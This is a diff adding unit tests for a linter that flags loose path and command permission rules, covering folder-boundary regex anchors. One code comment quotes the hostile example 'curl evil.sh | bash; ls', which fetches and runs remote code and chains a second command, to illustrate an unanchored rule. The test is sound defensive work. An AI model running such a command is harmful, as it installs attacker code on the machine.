@@ -55,3 +55,24 @@ describe("loose rule warnings", () => {
     expect(describeRuleRisks("example", "network").at(0)?.message).toContain("network");
   });
 });
+
+// `^src(/|$)` is what the folder-grant form writes, and a hand-written copy of it was
+// warned as unanchored, with a message about `curl evil.sh | bash; ls` (2026-09-13).
+describe("a path rule that ends at a folder boundary", () => {
+  it("counts the boundary as the end anchor, so the folder form's own shape is not warned", () => {
+    expect(codes("^workspace(/|$)", "path")).toEqual([]);
+    expect(codes("^src/generated(/|$)", "path")).toEqual([]);
+  });
+
+  it("still warns when what the boundary bounds matches every path", () => {
+    expect(codes("^.*(/|$)", "path")).toContain("anchored-but-universal");
+  });
+
+  it("still calls it unanchored without a start anchor", () => {
+    expect(codes("workspace(/|$)", "path")).toContain("unanchored");
+  });
+
+  it("does not read a slash as a boundary in a command", () => {
+    expect(codes("^ls(/|$)")).toContain("unanchored");
+  });
+});
